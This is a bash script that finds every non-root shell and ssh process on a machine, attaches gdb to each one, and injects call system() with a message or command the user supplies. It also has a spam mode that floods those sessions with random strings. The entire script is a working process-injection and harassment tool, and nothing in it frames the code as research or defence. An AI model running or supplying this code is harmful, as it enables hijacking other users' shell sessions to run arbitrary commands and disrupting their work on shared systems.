#!/bin/bash

# Get the script's PID
SCRIPT_PID=$$

# Function to handle SIGINT signal
sigint_handler() {
    echo "Exiting..."
    exit 1
}

# Function for error handling
handle_error() {
    local error_message="$1"
    echo "Error: $error_message"
}

# Sanitize function to remove unwanted characters
sanitize() {
    local input="$1"
    sanitized=$(echo "$input" | sed 's/[^[:alnum:]!_@#/$%,^*?.[:space:]\\]//g')
    echo "$sanitized"
}

# Check if a PID belongs to the script itself
is_script_pid() {
    local pid="$1"
    [ "$pid" -eq "$SCRIPT_PID" ] && return 0 || return 1
}

# Generate random string
CHARSET="0123456789abcdefABCDEF"
generate_string() {
    local length=$1
    tr -dc "$CHARSET" < /dev/urandom | head -c $length
}
LENGTH=50

# Trap SIGINT signal and call the handler function
trap sigint_handler SIGINT

# Initialize command option
command_option="echo"
message=""

# Check if -c flag is provided and set the command option accordingly
if [ "$1" = "-c" ]; then
    c_flag="true"
    command_option=''
fi

# Check if --spam flag is provided and set the command option accordingly
if [ "$1" = "--spam" ]; then
    spam="true"
    echo "$spam"
    shift
fi

echo "Script PID: $SCRIPT_PID"

while true; do
    # Prompt user for message if not spam mode, command is not set to "echo", and message is not set
    if [ "$spam" != "true" ]  && [ -z "$message" ]; then
        read -p "Enter a message/code to send: " message
    fi
    
    if [ "$spam" != "true" ] && [ -z "$message" ]; then
        handle_error "Message cannot be empty"
        continue
    fi

    if [ "$spam" = "true" ]; then
        message=$(generate_string $LENGTH)
    fi

    sanitized_message=$(sanitize "$message")
    
    if [ -z "$sanitized_message" ]; then
        handle_error "Sanitized message is empty"
        continue
    fi

    echo "The command for gdb will look like: call system(\"$command_option $sanitized_message\")"

    # Get the list of PIDs for non-root processes excluding the script's PID
    pids=$(ps -e -o pid,user,cmd | grep -E '(/bin/)?(bash|ssh|sh|zsh|fish|tcsh|csh|dash|ksh|ash|zsh|rc|sash|scsh|esh|psh|posh)'| grep -v 'root' | grep -v grep | awk '{print $1}')

    if [ -z "$pids" ]; then
        handle_error "No matching processes found"
        sleep 5
        continue
    fi

    # Filter out the script's PID from the list of PIDs
    filtered_pids=""
    for pid in $pids; do
        if ! is_script_pid "$pid"; then
            filtered_pids+="$pid "
        fi
    done

    if [ -z "$filtered_pids" ]; then
        handle_error "No matching processes found (excluding script's PID)"
        sleep 5
        continue
    fi
    
    # Iterate over filtered PIDs
    for pid in $filtered_pids; do
        # Execute GDB commands only if sanitized message is not empty
        if [ -n "$sanitized_message" ]; then
            gdb -p $pid >/dev/null 2>&1 <<EOF &

                call system("$command_option $sanitized_message")
                quit
EOF

            if [ $? -ne 0 ]; then
                handle_error "Failed to send message to pid $pid"
            else
                echo "Message sent to pid $pid"
            fi
            
            if [ "$spam" = "true" ]; then
                sleep 0.1
            fi
        fi
    done

    # Reset message for the next iteration
    message=""
done
